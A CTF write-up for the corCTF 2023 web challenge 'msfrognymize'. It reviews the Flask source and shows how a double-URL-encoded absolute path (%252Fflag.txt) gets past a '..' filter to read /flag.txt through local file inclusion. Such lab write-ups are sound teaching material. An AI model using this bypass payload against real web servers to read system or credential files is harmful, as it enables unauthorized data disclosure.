# msfrognymize

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Contributor: @siunam
- Solved by: @flocto
- 64 solves / 147 points
- Author: jazzpizazz
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

At CoR we care greatly about privacy (especially FizzBuzz). For this reason we anonymize any selfies before sharing them on Discord. We even encrypt the metadata using a special key!

[msfrognymize.be.ax](https://msfrognymize.be.ax)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731135210.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731135659.png)

In the index page (`/`), we can upload some images.

Let's try to upload one:

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731135922.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731135932.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731140047.png)

Our uploaded image's faces has been anonymized by frogs to a certain degrees.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731140102.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731140114.png)

When we uploaded an image, it'll send a POST request to `/` with `name=file`, `filename`, `Content-Type: image/jpeg`, and the raw bytes of the image.

Once the processing is finished, it'll redirect us to `/anonymized/<UUIDv4>.png`.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/web/msfrognymize/msfrognymize.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/msfrognymize)-[2023.07.31|14:04:44(HKT)]
└> file msfrognymize.tar.gz 
msfrognymize.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 101867520
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/msfrognymize)-[2023.07.31|14:04:46(HKT)]
└> tar xf msfrognymize.tar.gz                 
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/msfrognymize)-[2023.07.31|14:04:54(HKT)]
└> ls -lah msfrognymize
total 88K
drwxr-xr-x 7 siunam nam 4.0K Jul 26 17:15 .
drwxr-xr-x 3 siunam nam 4.0K Jul 31 14:04 ..
-rw-r--r-- 1 siunam nam 2.6K Jul 26 17:15 app.py
-rw-r--r-- 1 siunam nam  479 Jul 26 17:15 celery_config.py
drwxr-xr-x 2 siunam nam 4.0K Jul 26 17:15 data
-rw-r--r-- 1 siunam nam  485 Jul 26 17:15 Dockerfile
-rw-r--r-- 1 siunam nam   18 Jul 26 17:15 flag.txt
-rw-r--r-- 1 siunam nam  315 Jul 26 17:15 Pipfile
-rw-r--r-- 1 siunam nam  32K Jul 26 17:15 Pipfile.lock
drwxr-xr-x 2 siunam nam 4.0K Jul 26 17:15 src
drwxr-xr-x 3 siunam nam 4.0K Jul 26 17:15 static
-rw-r--r-- 1 siunam nam  772 Jul 26 17:15 supervisord.conf
-rw-r--r-- 1 siunam nam  657 Jul 26 17:15 tasks.py
drwxr-xr-x 2 siunam nam 4.0K Jul 26 17:15 templates
drwxr-xr-x 2 siunam nam 4.0K Jul 26 17:15 uploads
```

**Dockerfile:**
```sh
FROM python:3.9

RUN apt-get update && apt-get install -y --no-install-recommends \
    libgl1-mesa-glx \
    redis-server \
    supervisor \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY Pipfile Pipfile.lock /app/

RUN pip install pipenv && \
    pipenv install --system --deploy --ignore-pipfile

COPY . /app

RUN mv flag.txt /

EXPOSE 4444

COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf

CMD ["supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]
```

**The flag file is in `/flag.txt`.**

After fumbling around, the `app.py` is the main web application source code.

**Route `/`:**
```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        file = request.files['file']
        if file:
            try:
                img = Image.open(file)
                if img.format != "JPEG":
                    return "Please upload a valid JPEG image.", 400

                exif_data = img._getexif()
                encrypted_exif = None
                if exif_data:
                    encrypted_exif = piexif.dump(encrypt_exif_data(exif_data))
                filename = secure_filename(file.filename)
                temp_path = os.path.join(tempfile.gettempdir(), filename)
                img.save(temp_path)

                unique_id = str(uuid.uuid4())
                new_file_path = os.path.join(UPLOAD_FOLDER, f"{unique_id}.png")
                process_image.apply_async(args=[temp_path, new_file_path, encrypted_exif])

                return render_template("processing.html", image_url=f"/anonymized/{unique_id}.png")

            except Exception as e:
                return f"Error: {e}", 400

    return render_template("index.html")
```

As you can see, when POST request is sent:

- It'll first check the image format is JPEG or not
- Retrieve all the Exif (Exchangeable image file format) data and encrypt it
- Then save the image to a temporary path, **with `secure_filename()` to prevent path traversal**
- Finally anonymize the image's faces

After reading this route's code, it seems like it's **not possible to upload arbitrary files and overwrite some files**. 

**Route `/anonymized/<image_file>`:**
```python
from urllib.parse import unquote
[...]
UPLOAD_FOLDER = 'uploads/'
[...]
@app.route('/anonymized/<image_file>')
def serve_image(image_file):
    file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
    if ".." in file_path or not os.path.exists(file_path):
        return f"Image {file_path} cannot be found.", 404
    return send_file(file_path, mimetype='image/png')
```

When a GET request is sent to `/anonymized/<image_file>`, it'll:

- URL decode the image filename (`image_file`), and join the path `UPLOAD_FOLDER`, which will then become `uploads/<image_file>`
- Check if `..` and the file path (`uploads/<image_file>`) exist or not
- Finally, send the image to the client with MIME type (Media type) `image/png`

Hmm... **Looks like route `/anonymized/<image_file>` is vulnerable to path traversal and Local File Inclusion (LFI)?**

## Exploitation

But first, we need to **bypass the `..` filter.**

According to [`urllib.parse` library's documentation](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.unquote), `unquote()` URL decode only ***one layer***.

That being said, we can bypass the `..` filter by **double URL encoding**!!

**According to [`os.path.join()` documentation](https://docs.python.org/3/library/os.path.html#os.path.join):**

> "If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment."

```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/msfrognymize)-[2023.07.31|17:00:45(HKT)]
└> python3
[...]
>>> import os
>>> os.path.join('uploads/', '/flag.txt')
'/flag.txt'
>>> os.path.join('uploads/', 'flag.txt')
'uploads/flag.txt'
```

**That being said, we can double URL encode `/` (`%252F`):** (From [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)URL_Encode(true)&input=Lw))
```
%252F -> %2F -> /
```

**Hence, we can use `%252Fflag.txt` to get the flag:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731143845.png)

- **Flag: `corctf{Fr0m_Priv4cy_t0_LFI}`**

## Conclusion

What we've learned:

1. Local File Inclusion (LFI) & Filter Bypass Via Double URL Encoding